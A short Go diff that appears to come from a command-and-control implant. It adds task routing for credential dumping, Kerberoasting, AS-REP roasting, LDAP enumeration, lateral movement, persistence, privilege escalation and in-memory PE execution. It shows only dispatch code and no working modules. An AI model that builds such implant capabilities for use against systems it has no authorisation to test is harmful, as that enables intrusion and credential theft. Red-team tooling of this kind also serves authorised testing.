@@ -88,6 +88,16 @@ func (e *Executor) Execute(task *pb.Task) *pb.TaskResult {
 		data, err = executeSocksStart(ctx, task.Data)
 	case pb.TaskType_TASK_SOCKS_STOP:
 		data, err = executeSocksStop(ctx, task.Data)
+	case pb.TaskType_TASK_CREDS_DUMP,
+		pb.TaskType_TASK_LDAP_ENUM,
+		pb.TaskType_TASK_KERBEROAST,
+		pb.TaskType_TASK_ASREPROAST,
+		pb.TaskType_TASK_LATERAL_MOVE,
+		pb.TaskType_TASK_PERSIST,
+		pb.TaskType_TASK_PRIVESC:
+		data, err = e.executeTypedModule(ctx, task.TaskType, task.Data)
+	case pb.TaskType_TASK_PE_LOAD_EXEC:
+		data, err = executePELoad(ctx, task.Data)
 	default:
 		err = fmt.Errorf("unsupported task type: %s", task.TaskType)
 	}
